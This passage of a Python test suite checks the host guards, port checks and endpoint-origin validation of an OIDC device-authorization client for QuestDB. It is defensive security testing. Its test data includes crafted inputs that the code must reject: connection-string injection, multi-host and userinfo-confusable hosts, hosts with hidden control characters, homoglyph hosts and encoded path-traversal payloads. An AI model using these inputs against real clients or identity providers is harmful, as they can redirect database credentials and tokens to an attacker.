        # from a worker thread (the pool context) and assert the refusal
        # propagates. A regression to auth.token() / allow_interactive=True would
        # return 'TKN' here and NOT raise, failing this test.
        auth = _FakeAuth('TKN', interactive_required=True)
        events = {}

        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []
        fake_sa.create_engine = lambda url, **kw: object()

        class _Event:
            @staticmethod
            def listens_for(target, name):
                def deco(fn):
                    events.update(name=name, fn=fn)
                    return fn
                return deco

        fake_sa.event = _Event
        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                return 'URL'

        fake_eng.URL = _URL
        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': types.ModuleType('psycopg')}):
            sqlalchemy_engine(auth, 'https://db.example.com:9000')

        provide_token = events['fn']
        box = {}

        def run():
            try:
                provide_token(None, None, [], {})
            except BaseException as e:  # noqa: BLE001 - re-raised via the box
                box['exc'] = e

        t = threading.Thread(target=run)
        t.start()
        t.join(5)
        # A bounded join + is_alive check so a per-connect fetch that blocks
        # (regression) fails cleanly instead of hanging the suite.
        self.assertFalse(t.is_alive(), 'per-connect token fetch did not return')
        self.assertIsInstance(box.get('exc'), OidcInteractionRequired)
        # The load-bearing half: it refused because the fetch was non-interactive.
        self.assertIs(auth.last_allow_interactive, False)

    def test_sqlalchemy_engine_uses_bare_ipv6_host(self):
        # m6: SQLAlchemy's URL.create takes host and port separately and hands
        # the host to the driver as a connect kwarg (not a "host:port" DSN
        # string), so the host must be the UNBRACKETED IPv6 literal '::1' —
        # exactly as the (separately tested) psycopg path passes it. Asserted at
        # the adapter boundary; real SQLAlchemy is not a test dependency.
        created = {}
        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []
        fake_sa.create_engine = lambda url, **kw: object()

        class _Event:
            @staticmethod
            def listens_for(target, name):
                return lambda fn: fn

        fake_sa.event = _Event
        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                created.update(kw)
                return 'URL'

        fake_eng.URL = _URL
        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': types.ModuleType('psycopg')}):
            sqlalchemy_engine(_FakeAuth(), 'https://[::1]:9000')
        self.assertEqual(created['host'], '::1')  # unbracketed, like psycopg
        self.assertEqual(created['port'], 8812)

    def test_sqlalchemy_engine_uses_psycopg2_drivername(self):
        # When only psycopg2 (v2) is importable, the SQLAlchemy driver name is
        # postgresql+psycopg2, not +psycopg (the v3 branch).
        created = {}
        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []
        fake_sa.create_engine = lambda url, **kw: object()

        class _Event:
            @staticmethod
            def listens_for(target, name):
                return lambda fn: fn

        fake_sa.event = _Event
        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                created.update(kw)
                return 'URL'

        fake_eng.URL = _URL
        fake_pg2 = types.ModuleType('psycopg2')

        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': None,        # force the psycopg2 fallback in _pg_module
                'psycopg2': fake_pg2}):
            sqlalchemy_engine(_FakeAuth(), 'http://db.example.com:9000')
        self.assertEqual(created['drivername'], 'postgresql+psycopg2')

    def test_require_host_rejects_hostless_url(self):
        # A URL with no extractable host must raise, not pass None to a driver;
        # an explicit host= override still resolves.
        for bad in ('localhost', 'questdb:9000'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    _require_host(bad)
        self.assertEqual(_require_host('localhost', 'h.example'), 'h.example')

    def test_require_host_malformed_port_raises_config_error(self):
        # A QuestDB URL with a non-integer port must raise OidcConfigError (via
        # safe_urlparse), not a bare ValueError.
        with self.assertRaises(OidcConfigError):
            _require_host('https://questdb.example.com:notaport')

    def test_require_host_with_conf_metachars_rejected(self):
        # A host containing connection-string delimiters (';' / '=') or
        # whitespace must be rejected, never spliced into PG connection
        # parameters (psycopg builds a libpq conninfo string from its kwargs).
        # urlparse() keeps ';'/'=' in .hostname.
        for bad in ('https://realhost;sslmode=disable;x=', 'https://a=b'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    _require_host(bad)
        # An explicit host= override goes through the same guard: whitespace
        # (never valid in a host) and an IPv6 zone-id '%' (meaningful only for a
        # link-local address on the local machine, never a remote QuestDB) are
        # rejected too, keeping the guard a strict plain-host allowlist.
        for bad_host in ('evil;sslmode=disable', 'a=b', 'h ost', 'fe80::1%eth0'):
            with self.subTest(host=bad_host):
                with self.assertRaises(OidcConfigError):
                    _require_host('https://db.example.com:9000', bad_host)
        # A legitimate host (incl. an IPv6 literal, which contains ':') is
        # still accepted — the guard must not over-reject.
        self.assertEqual(
            _require_host('https://db.example.com:9000', '::1'), '::1')
        self.assertEqual(
            _require_host('https://db.example.com:9000', 'questdb.example.com'),
            'questdb.example.com')

    def test_require_host_rejects_multihost_comma_and_unix_socket(self):
        # Regression: the host guard is a positive allow-list, so characters that
        # are NOT conninfo delimiters (which the old deny-list caught) but ARE
        # libpq-meaningful must still be rejected — otherwise a tampered URL could
        # redirect the PG connection (and the '_sso' token sent as the password):
        #   * ',' is the libpq MULTI-HOST separator ('host=a,b' tries both), and
        #     urlparse keeps it in .hostname;
        #   * a leading '/' makes libpq read the value as a Unix-socket directory;
        #   * '@' (userinfo) never belongs in a bare host.
        for bad in ('https://good.questdb.com,evil.attacker.com:9000',
                    'https://good.questdb.com,evil.attacker.com'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    _require_host(bad)
        for bad_host in ('good.questdb.com,evil.attacker.com',  # multi-host
                         '[good,evil]',            # comma smuggled in brackets
                         '/var/run/postgresql',    # Unix-socket dir
                         '/tmp',
                         'good@evil'):              # userinfo
            with self.subTest(host=bad_host):
                with self.assertRaises(OidcConfigError):
                    _require_host('https://db.example.com:9000', bad_host)
        # A hostname carrying an underscore (accepted in practice, and by the
        # render / discovery host checks) is still allowed — the allow-list must
        # not over-reject a legitimate host.
        self.assertEqual(
            _require_host('https://db:9000', 'my_host.internal'),
            'my_host.internal')

    def test_require_host_unbrackets_explicit_ipv6(self):
        # m2: psycopg / SQLAlchemy take a BARE address. The URL-derived path is
        # already unbracketed by urlparse, but an explicit host="[::1]" override
        # used to reach the driver bracketed (→ a confusing connection failure on
        # a copy-pasted IPv6 literal). Both paths must yield the bare address.
        self.assertEqual(_require_host('https://[::1]:9000'), '::1')          # URL
        self.assertEqual(
            _require_host('https://db:9000', '[::1]'), '::1')                 # override
        self.assertEqual(
            _require_host('https://db:9000', '[2001:db8::1]'), '2001:db8::1')
        # A bare (unbracketed) literal is unchanged, and junk inside brackets is
        # still caught by the illegal-char guard after stripping.
        self.assertEqual(_require_host('https://db:9000', '::1'), '::1')
        with self.assertRaises(OidcConfigError):
            _require_host('https://db:9000', '[evil;sslmode=disable]')

    def test_pg_port_validation(self):
        # A non-integer pg_port (e.g. a port read from an env var without int())
        # must surface as OidcConfigError, not a bare ValueError / driver error
        # from URL.create(port=...) / connect(port=...). The check runs before
        # the driver import, so it holds even without sqlalchemy / psycopg.
        from questdb.auth._adapters import _coerce_port
        # float('inf')/1e400 raise OverflowError (not ValueError) from int();
        # float('nan') raises ValueError. Both must map to OidcConfigError.
        for bad in ('not-a-port', None, '88a2', True, 0, 70000, -1,
                    8812.9,  # a non-integral float would silently truncate
                    float('inf'), float('-inf'), float('nan'), 1e400):
            with self.subTest(pg_port=bad):
                with self.assertRaises(OidcConfigError):
                    _coerce_port(bad)
        self.assertEqual(_coerce_port(8812), 8812)
        self.assertEqual(_coerce_port('5432'), 5432)   # str port coerced
        self.assertEqual(_coerce_port(8812.0), 8812)   # integral float accepted
        # Both adapter entry points reject it up front (no driver required).
        for fn in (sqlalchemy_engine, psycopg_connect):
            with self.subTest(fn=fn.__name__):
                with self.assertRaises(OidcConfigError):
                    fn(_FakeAuth(), 'https://db.example.com:9000',
                       pg_port='not-a-port')

    @unittest.skipIf(importlib.util.find_spec('sqlalchemy') is not None,
                     'sqlalchemy installed')
    def test_sqlalchemy_engine_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            sqlalchemy_engine(_FakeAuth(), 'https://db.example.com:9000')

    @unittest.skipIf(_HAS_PG_DRIVER, 'a PostgreSQL driver is installed')
    def test_psycopg_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            psycopg_connect(_FakeAuth(), 'https://db.example.com:9000')

    @unittest.skipIf(_HAS_PG_DRIVER, 'a PostgreSQL driver is installed')
    def test_pg_module_missing_chains_cause(self):
        # The "no PG driver" ImportError chains the underlying import failure
        # (raise ... from e) so the traceback preserves the real cause.
        from questdb.auth._adapters import _pg_module
        with self.assertRaises(ImportError) as cm:
            _pg_module()
        self.assertIsInstance(cm.exception.__cause__, ImportError)

    def test_pg_module_selection_order(self):
        # m8: _pg_module prefers psycopg v3, else psycopg2, else raises a chained
        # ImportError. Force the module presence via sys.modules so the ordering
        # is exercised regardless of which driver is actually installed (the
        # missing-driver tests above skip when one is present). A None entry in
        # sys.modules makes `import <name>` raise ImportError.
        from questdb.auth._adapters import _pg_module
        fake_v3 = types.ModuleType('psycopg')
        fake_v2 = types.ModuleType('psycopg2')
        with mock.patch.dict(sys.modules,
                             {'psycopg': fake_v3, 'psycopg2': fake_v2}):
            self.assertIs(_pg_module(), fake_v3)        # both present -> v3 wins
        with mock.patch.dict(sys.modules,
                             {'psycopg': None, 'psycopg2': fake_v2}):
            self.assertIs(_pg_module(), fake_v2)        # only v2 -> fall back
        with mock.patch.dict(sys.modules,
                             {'psycopg': None, 'psycopg2': None}):
            with self.assertRaises(ImportError) as cm:  # neither -> chained error
                _pg_module()
        self.assertIsInstance(cm.exception.__cause__, ImportError)


class TestConfigHelpers(unittest.TestCase):
    def test_as_bool_variants(self):
        from questdb.auth._discovery import _as_bool
        for v in ('true', 'True', '1', 'yes', 'on', True, 1):
            self.assertIs(_as_bool(v), True)
        for v in ('false', '0', 'no', 'off', '', False, 0):
            self.assertIs(_as_bool(v), False)
        self.assertIsNone(_as_bool(None))
        self.assertIs(_as_bool(None, default=True), True)
        # A non-0/1 number coerces via bool(); an unrecognized string / type
        # falls back to the default rather than guessing True/False.
        self.assertIs(_as_bool(2), True)
        self.assertIs(_as_bool(0.0), False)
        self.assertIsNone(_as_bool('maybe'))
        self.assertIs(_as_bool('maybe', default=False), False)

    def test_resolve_endpoint_accepts_only_absolute_url(self):
        # Matching the Java client, a /settings endpoint is trusted only as a
        # complete http(s) URL. A path-only value is NOT assembled from
        # acl.oidc.host / port / tls.enabled (no longer read) — it reads as
        # absent so resolution falls back to .well-known discovery.
        from questdb.auth._discovery import _resolve_endpoint
        self.assertEqual(_resolve_endpoint('https://idp/x'), 'https://idp/x')
        self.assertEqual(_resolve_endpoint('http://idp:9000/x'),
                         'http://idp:9000/x')
        self.assertIsNone(_resolve_endpoint('/as/token.oauth2'))
        self.assertIsNone(_resolve_endpoint(''))
        self.assertIsNone(_resolve_endpoint('//idp/x'))     # scheme-relative
        self.assertIsNone(_resolve_endpoint('ftp://idp/x'))  # non-http scheme

    def test_resolve_endpoint_ignores_non_string(self):
        # A non-string endpoint from /settings (e.g. a JSON number) must be
        # treated as absent, not raise AttributeError from .startswith(). M3.
        from questdb.auth._discovery import _resolve_endpoint
        self.assertIsNone(_resolve_endpoint(8080))
        self.assertIsNone(_resolve_endpoint(True))

    def test_str_setting_ignores_non_string(self):
        # A non-empty string passes through; anything else (a JSON list /
        # number / dict, None, empty string) reads as absent so it can't reach
        # scope.split() / the cache-key join as a raw object.
        from questdb.auth._discovery import _str_setting
        self.assertEqual(_str_setting('openid email'), 'openid email')
        for bad in (['openid'], 12345, {'x': 1}, True, '', None):
            self.assertIsNone(_str_setting(bad))

    def test_non_string_settings_do_not_crash_resolution(self):
        # A buggy/tampered /settings advertising non-string acl.oidc.* values
        # must stay within the typed-error contract instead of crashing later
        # with a bare AttributeError / TypeError (scope.split() / the cache-key
        # join). scope falls back to 'openid', audience drops to None, and a
        # non-string client.id reads as absent -> clear OidcConfigError.
        from questdb.auth import _discovery
        base = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://idp.example.com/token',
            'acl.oidc.device.authorization.endpoint':
                'https://idp.example.com/device'}

        def from_settings(settings):
            with mock.patch.object(_discovery, 'fetch_settings',
                                   return_value=settings):
                return OidcDeviceAuth.from_questdb(
                    'https://qdb.example.com:9000', renderer=Renderer())

        auth = from_settings({**base, 'acl.oidc.scope': ['openid', 'groups'],
                              'acl.oidc.audience': {'x': 1}})
        self.assertEqual(auth.config.scope, 'openid')   # non-string -> default
        self.assertIsNone(auth.config.audience)         # non-string -> dropped
        self.assertTrue(auth.cache_key)                 # crash site now safe
        # A non-string client.id reads as absent -> clear typed error.
        with self.assertRaises(OidcConfigError):
            from_settings({**base, 'acl.oidc.client.id': 12345})

    def test_non_string_idp_discovery_values_do_not_crash(self):
        # The IdP .well-known discovery document is untrusted too: a non-string
        # endpoint / issuer (a JSON number/list from a buggy or hostile IdP)
        # must read as absent -> a clear OidcConfigError, not a bare
        # AttributeError from safe_urlparse later. See resolve_config discovery.
        from questdb.auth import _discovery
        settings = {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'}

        def from_discovery(well_known, **kw):
            with mock.patch.object(_discovery, 'fetch_settings',
                                   return_value=settings), \
                 mock.patch.object(
                     _discovery, 'discover_device_endpoint_from_idp',
                     return_value=well_known):
                return OidcDeviceAuth.from_questdb(
                    'https://qdb.example.com:9000', renderer=Renderer(), **kw)

        # Non-string token / device endpoint -> absent -> clear typed error.
        with self.assertRaises(OidcConfigError):
            from_discovery(
                {'device_authorization_endpoint': 'https://idp.example.com/device',
                 'token_endpoint': 12345},
                issuer='https://idp.example.com')
        with self.assertRaises(OidcConfigError):
            from_discovery(
                {'device_authorization_endpoint': ['nope'],
                 'token_endpoint': 'https://idp.example.com/token'},
                issuer='https://idp.example.com')
        # Valid discovered endpoints still resolve and the cache key builds
        # (the former non-string-field crash site).
        auth = from_discovery(
            {'device_authorization_endpoint': 'https://idp.example.com/device',
             'token_endpoint': 'https://idp.example.com/token'},
            issuer='https://idp.example.com')
        self.assertEqual(auth.config.issuer, 'https://idp.example.com')
        self.assertTrue(auth.cache_key)

    def test_settings_config_nesting(self):
        from questdb.auth._discovery import settings_config
        self.assertEqual(settings_config({'config': {'a': 1}}), {'a': 1})
        self.assertEqual(settings_config({'a': 1}), {'a': 1})  # flat fallback

    def test_settings_url_drops_query_and_fragment(self):
        # M9: the /settings endpoint is built on the QuestDB base URL's PATH,
        # dropping any query/fragment, so a base carrying one can't yield a
        # malformed ".../?x=1/settings". A trailing slash doesn't double up.
        from questdb.auth._discovery import _settings_url
        self.assertEqual(_settings_url('https://h:9000'),
                         'https://h:9000/settings')
        self.assertEqual(_settings_url('https://h:9000/'),
                         'https://h:9000/settings')
        self.assertEqual(_settings_url('https://h:9000/qdb'),
                         'https://h:9000/qdb/settings')
        self.assertEqual(_settings_url('https://h:9000/?x=1'),
                         'https://h:9000/settings')
        self.assertEqual(_settings_url('https://h:9000/base/#frag'),
                         'https://h:9000/base/settings')

    def test_settings_url_requires_explicit_scheme(self):
        # A scheme-less QuestDB URL ("questdb.example.com:9000") mis-parses --
        # urllib reads the host as the scheme -- so _settings_url rejects it with
        # a clear typed error up front, rather than letting it surface much later
        # as a confusing "insecure URL (scheme 'questdb.example.com')" from
        # _require_secure. A non-http(s) scheme is rejected for the same reason.
        from questdb.auth._discovery import _settings_url
        for bad in ('questdb.example.com:9000', 'h:9000',
                    'ftp://h:9000', '//h:9000'):
            with self.assertRaises(OidcConfigError):
                _settings_url(bad)

    def test_settings_config_ignores_user_writable_preferences(self):
        # QuestDB /settings nests server-authoritative values under "config"
        # alongside a user-writable "preferences" sibling (the web console
        # persists UI prefs there). Discovery must read only "config", so a user
        # who can write a preference cannot smuggle an acl.oidc.* key in to
        # redirect the device code / refresh token. Ported from the Java client.
        from questdb.auth._discovery import settings_config
        resp = {
            'config': {
                'acl.oidc.client.id': 'questdb',
                'acl.oidc.token.endpoint': 'https://idp.example.com/token'},
            'preferences.version': 0,
            'preferences': {
                'acl.oidc.token.endpoint': 'https://evil.example.com/token'},
        }
        cfg = settings_config(resp)
        self.assertEqual(cfg['acl.oidc.token.endpoint'],
                         'https://idp.example.com/token')
        self.assertNotIn('evil', str(cfg))
        # A structured response (one carrying the user-writable "preferences"
        # sibling) must NOT fall back to trusting the top level when "config" is
        # absent or malformed: read nothing rather than the top level.
        self.assertEqual(
            settings_config({'preferences': {'acl.oidc.token.endpoint': 'x'}}),
            {})
        self.assertEqual(
            settings_config({'config': None,
                             'preferences': {'acl.oidc.client.id': 'x'}}),
            {})
        # A genuinely flat / legacy response (no config/preferences split) is
        # still tolerated at the top level.
        self.assertEqual(settings_config({'acl.oidc.client.id': 'q'}),
                         {'acl.oidc.client.id': 'q'})

    def test_example_oidc_device_auth_imports(self):
        # examples/oidc_device_auth.py is NOT in examples.manifest.yaml — it needs
        # a live IdP and an interactive sign-in, so it can't run as a system test
        # — hence nothing else import-checks it. Import it here (main() is guarded
        # by __name__, so importing runs no I/O / sign-in) to catch a syntax error
        # or public-API drift: a renamed/removed questdb.auth symbol in its
        # top-level import would fail this test.
        example = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'examples', 'oidc_device_auth.py')
        self.assertTrue(os.path.exists(example), example)
        spec = importlib.util.spec_from_file_location(
            'oidc_device_auth_example', example)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)  # triggers `from questdb.auth import ...`
        self.assertTrue(hasattr(module, 'main'))


class TestEndpointValidation(unittest.TestCase):
    def setUp(self):
        from questdb.auth._discovery import validate_endpoint_origins
        self._validate = validate_endpoint_origins

    def test_default_port_equivalence_accepted(self):
        # https default (443) vs explicit :443 normalize to the same origin.
        self._validate('https://idp/token', 'https://idp:443/device')

    def test_normalized_origin_keeps_explicit_zero_port(self):
        # m6: an explicit :0 must not collapse to the default port (0 is falsy
        # but a real, distinct port value), so it stays a distinct origin rather
        # than aliasing the default. Not exploitable (:0 isn't connectable) — a
        # normalization tidy.
        from questdb.auth._discovery import _normalized_origin
        self.assertEqual(_normalized_origin('https://h:0/x'), ('https', 'h', 0))
        self.assertNotEqual(_normalized_origin('https://h:0/x'),
                            _normalized_origin('https://h/x'))

    def test_ipv6_same_origin_accepted(self):
        self._validate('https://[::1]/token', 'https://[::1]/device')

    def test_off_origin_device_rejected(self):
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp/token', 'https://evil.example/device')

    def test_co_located_endpoints_accepted(self):
        # validate_endpoint_origins now enforces ONLY co-location: the two
        # credential endpoints must share an origin. The issuer-ORIGIN pin for
        # /settings-sourced endpoints moved to resolve_config (where each
        # endpoint's provenance is known), so a caller/discovery endpoint set
        # whose origin differs from the issuer is no longer rejected here — see
        # test_issuer_pin_rejects_off_origin_endpoints (/settings rejection) and
        # test_explicit_cross_origin_issuer_accepted (Google-style acceptance).
        self._validate('https://idp/token', 'https://idp/device')

    def test_explicit_cross_origin_issuer_accepted(self):
        # Google-style IdP: the issuer host differs from the endpoint host
        # (issues from accounts.google.com, serves tokens from
        # oauth2.googleapis.com). Endpoints passed explicitly are authoritative,
        # so a cross-origin issuer must NOT be rejected — the issuer is an OIDC
        # identifier, not necessarily the endpoints' host.
        auth = OidcDeviceAuth(
            client_id='questdb',
            token_endpoint='https://oauth2.googleapis.com/token',
            device_authorization_endpoint=
                'https://oauth2.googleapis.com/device/code',
            issuer='https://accounts.google.com',
            renderer=Renderer())
        self.assertEqual(auth.config.token_endpoint,
                         'https://oauth2.googleapis.com/token')

    def test_malformed_port_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not urllib's bare
        # ValueError (which callers catching OidcError would miss). See M6.
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp:notaport/token',
                           'https://idp:notaport/device')

    def test_malformed_ipv6_endpoint_raises_config_error(self):
        # A malformed IPv6 literal makes urllib.parse.urlparse() itself raise
        # ValueError (before .port is read); it must surface as OidcConfigError,
        # not a bare ValueError escaping the typed-error contract. See M1.
        with self.assertRaises(OidcConfigError):
            self._validate('https://[::1', 'https://[::1')
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth(
                client_id='questdb',
                device_authorization_endpoint='https://[::1',
                token_endpoint='https://[::1',
                renderer=Renderer())

    def test_explicit_constructor_enforces_co_location(self):
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth(
                client_id='questdb',
                device_authorization_endpoint='https://idp.example.com/device',
                token_endpoint='https://attacker.example/token',
                renderer=Renderer())

    def test_confusable_authority_endpoint_rejected(self):
        # M1: urlparse(url).hostname (what co-location, the issuer-origin pin and
        # the cache key all derive the host from) can report a DIFFERENT host
        # than urllib connects to when the authority carries userinfo. E.g.
        # 'https://attacker.evil\\@idp.good/token' parses with hostname
        # 'idp.good' (passing the origin pin) while urllib connects to the full
        # 'attacker.evil\\@idp.good'. Such an endpoint must be rejected on every
        # construction path, fail-closed.
        from questdb.auth._discovery import _reject_confusable_authority
        for url in ('https://attacker.evil\\@idp.good/token',
                    'https://idp.good@attacker.evil/token'):
            with self.assertRaises(OidcConfigError):
                _reject_confusable_authority(url, label='token endpoint')
            with self.assertRaises(OidcConfigError):   # public co-location entry
                self._validate(url, url)
            with self.assertRaises(OidcConfigError):   # and the full constructor
                OidcDeviceAuth(
                    client_id='questdb',
                    device_authorization_endpoint=url,
                    token_endpoint=url,
                    renderer=Renderer())
        # A legitimate IPv6-literal authority is NOT flagged as confusable.
        self._validate('https://[::1]:443/token', 'https://[::1]:443/device')

    def test_non_ascii_authority_endpoint_rejected(self):
        # M2: a non-ASCII endpoint host is rejected fail-closed on every
        # construction path. It is a homoglyph/confusable spoofing vector (the
        # renderer already distrusts it for display), and http.client cannot even
        # encode it — it would otherwise reach the transport and raise a raw
        # UnicodeEncodeError instead of a typed error. An IDN must be given in its
        # ASCII xn-- punycode form.
        from questdb.auth._discovery import _reject_confusable_authority
        for url in ('https://bаd.example/token',          # Cyrillic 'а'
                    'https://idp.exämple.com/token'):       # 'ä'
            with self.assertRaises(OidcConfigError):
                _reject_confusable_authority(url, label='token endpoint')
            with self.assertRaises(OidcConfigError):   # public co-location entry
                self._validate(url, url)
            with self.assertRaises(OidcConfigError):   # and the full constructor
                OidcDeviceAuth(
                    client_id='questdb',
                    device_authorization_endpoint=url,
                    token_endpoint=url,
                    renderer=Renderer())
        # An ASCII xn-- punycode authority (how an IDN must be supplied) is NOT
        # flagged — isascii() admits it.
        self._validate('https://xn--bcher-kva.example/token',
                       'https://xn--bcher-kva.example/device')

    def test_tab_newline_cr_authority_rejected(self):
        # M1: urllib.parse.urlparse() SILENTLY REMOVES tab/newline/CR from the URL
        # before producing .netloc, while the transport (http.client via
        # urllib.request.Request.host) keeps them — so the host validated diverges
        # from the host connected to. The dangerous case is a byte that SPLITS a
        # trusted host: 'https://idp\tgood/token' parses with hostname 'idpgood'
        # via .netloc, but 'https://idp.goo\td/token' can leave the validated host
        # equal to a trusted name while urllib targets the raw bytes. These must be
        # rejected fail-closed on every construction path; _UNSAFE_AUTHORITY_RE
        # never sees them (urlparse stripped them first), so the guard checks the
        # RAW url.
        from questdb.auth._discovery import _reject_confusable_authority
        for url in ('https://idp.good\tevil.example/token',   # tab merges labels
                    'https://idp\t.good/token',               # tab splits a host
                    'https://idp.good\nevil.example/token',   # newline
                    'https://idp.good\revil.example/token'):  # CR
            with self.assertRaises(OidcConfigError):
                _reject_confusable_authority(url, label='token endpoint')
            with self.assertRaises(OidcConfigError):   # public co-location entry
                self._validate(url, url)
            with self.assertRaises(OidcConfigError):   # and the full constructor
                OidcDeviceAuth(
                    client_id='questdb',
                    device_authorization_endpoint=url,
                    token_endpoint=url,
                    renderer=Renderer())
        # A clean ASCII authority is NOT flagged.
        self._validate('https://idp.good/token', 'https://idp.good/device')

    def test_percent_authority_rejected(self):
        # A '%' in a credential-endpoint authority is rejected fail-closed on
        # every construction path: a real endpoint host never carries one. It is
        # either an IPv6 zone-id (e.g. 'fe80::1%eth0', an on-host link-local
        # artifact, never a way to reach a remote IdP) or percent-encoding (which
        # urlparse keeps in .hostname but a resolver/transport may decode,
        # diverging the validated host from the connected one). This mirrors the
        # host hygiene in _adapters._LEGAL_HOST_RE and _render._SAFE_HOST_RE,
        # which both reject '%' too.
        from questdb.auth._discovery import _reject_confusable_authority
        for url in ('https://[fe80::1%25eth0]/token',   # IPv6 zone-id (%25 == %)
                    'https://idp%2egood.evil/token'):    # percent-encoded host
            with self.assertRaises(OidcConfigError):
                _reject_confusable_authority(url, label='token endpoint')
            with self.assertRaises(OidcConfigError):   # public co-location entry
                self._validate(url, url)
            with self.assertRaises(OidcConfigError):   # and the full constructor
                OidcDeviceAuth(
                    client_id='questdb',
                    device_authorization_endpoint=url,
                    token_endpoint=url,
                    renderer=Renderer())
        # A plain (zone-id-free) IPv6 literal authority is NOT flagged.
        self._validate('https://[fe80::1]:443/token',
                       'https://[fe80::1]:443/device')

    def test_confusable_issuer_rejected(self):
        # M1 (defense-in-depth): a confusable issuer authority would make the
        # issuer-origin pin compare against the wrong host. With explicit
        # (caller-trusted) endpoints the pin loop is skipped, but the issuer is
        # still vetted up front, so this raises.
        from questdb.auth._discovery import resolve_config
        with self.assertRaises(OidcConfigError):
            resolve_config(
                client_id='questdb',
                token_endpoint='https://idp.good/token',
                device_authorization_endpoint='https://idp.good/device',
                issuer='https://idp.good@attacker.evil')

    def test_issuer_validated_in_direct_constructor(self):
        # The DIRECT OidcDeviceAuth(...) constructor — not only from_questdb /
        # resolve_config — must vet the issuer authority, so a confusable or
        # malformed issuer fails fast at construction (like the endpoints) instead
        # of lazily from cache_key on the first token() call.
        for bad in ('https://idp.good@attacker.evil',     # userinfo confusable
                    'https://idp.example:99999999999'):    # malformed port
            with self.assertRaises(OidcConfigError):
                OidcDeviceAuth(
                    client_id='c',
                    token_endpoint='https://idp.good/token',
                    device_authorization_endpoint='https://idp.good/device',
                    scope='openid', issuer=bad)

    def test_non_string_issuer_maps_to_config_error(self):
        # M1: resolve_config (the from_questdb path) PARSES the issuer — to vet
        # its authority and, when needed, build the IdP discovery URL — BEFORE
        # OidcDeviceAuth.__init__ can type-check it. urlparse raises a raw
        # AttributeError / TypeError on a non-str/bytes value, so without an early
        # guard a non-string issuer escaped the module's typed-error contract.
        # It must now map to OidcConfigError here too, matching the direct
        # constructor (test_issuer_validated_in_direct_constructor). This is the
        # only caller kwarg resolve_config parses before __init__ validates it —
        # a non-string client_id / endpoint is caught by __init__'s isinstance
        # guards, and a /settings-sourced value is always a string.
        from questdb.auth._discovery import resolve_config
        for bad in (123, b'https://idp', ['https://idp'], 12.5):
            with self.assertRaises(OidcConfigError):
                resolve_config(
                    client_id='questdb',
                    token_endpoint='https://idp.good/token',
                    device_authorization_endpoint='https://idp.good/device',
                    issuer=bad)

    def test_endpoint_path_under_issuer(self):
        # M1: segment-aware path containment used to isolate path-based realms.
        from questdb.auth._discovery import _endpoint_path_under_issuer as under
        iss = 'https://idp.example.com/realms/prod'
        self.assertTrue(under(iss + '/protocol/openid-connect/token', iss))
        self.assertTrue(under(iss, iss))                       # exact path
        self.assertTrue(under(iss + '/', iss))                 # trailing slash
        self.assertFalse(under('https://idp.example.com/realms/EVIL/token', iss))
        self.assertFalse(  # not a *segment* prefix: prod != production
            under('https://idp.example.com/realms/production/token', iss))
        # A root issuer (no path) constrains the origin only -> any path is in.
        self.assertTrue(
            under('https://idp.example.com/anything', 'https://idp.example.com'))
        self.assertTrue(
            under('https://idp.example.com/x', 'https://idp.example.com/'))
        # A '.' / '..' segment (even percent-encoded) is rejected: urllib sends
        # the dotted path verbatim and the IdP / proxy normalizes it to a
        # DIFFERENT realm, which an origin check can't catch.
        self.assertFalse(under(iss + '/../EVIL/protocol/token', iss))
        self.assertFalse(under(iss + '/%2e%2e/EVIL/token', iss))
        self.assertFalse(under(iss + '/./token', iss))
        # Encodings/escapes the old decode-once-then-compare-raw check let
        # through (M4): a server that unescapes more than once, folds a
        # backslash to '/', or normalizes the last segment's ;params would
        # resolve these to a DIFFERENT realm, so they must be rejected too.
        self.assertFalse(under(iss + '/%252e%252e/EVIL/token', iss))   # 2x-enc
        self.assertFalse(under(iss + '/..\\EVIL/token', iss))          # backslash
        self.assertFalse(under(iss + '/token;..%2f..%2fEVIL', iss))    # ;params
        # A ;-matrix param or trailing whitespace in a NON-last segment: urllib
        # only splits the FINAL segment's ;params off .path, so an inner '..;' /
        # '..\t' stays a literal segment. A proxy in the '..;/' traversal class
        # (Tomcat/Undertow) strips the param / trims the segment before
        # normalizing and resolves these to a DIFFERENT realm, so they must be
        # rejected too (regression test for the inner-segment path-pin bypass).
        self.assertFalse(under(iss + '/..;/EVIL/protocol/token', iss))  # ..;
        self.assertFalse(under(iss + '/%2e%2e;/EVIL/token', iss))       # enc ..;
        self.assertFalse(under(iss + '/..%09/EVIL/token', iss))         # ..<tab>
        # A dot segment wrapped in MORE encoding layers than the bounded decode
        # loop peels leaves a residual '%'; a server that decodes it further
        # would resolve to a DIFFERENT realm, so a segment that did not fully
        # decode is rejected (fail closed).
        enc_dot = '%' + '25' * 11 + '2e'      # a single '.' wrapped in 12 layers
        self.assertFalse(under(f'{iss}/{enc_dot}{enc_dot}/EVIL/token', iss))
        # A legitimate sub-path with a (non-traversal) percent-escape or matrix
        # param is still accepted — only dot traversal is rejected.
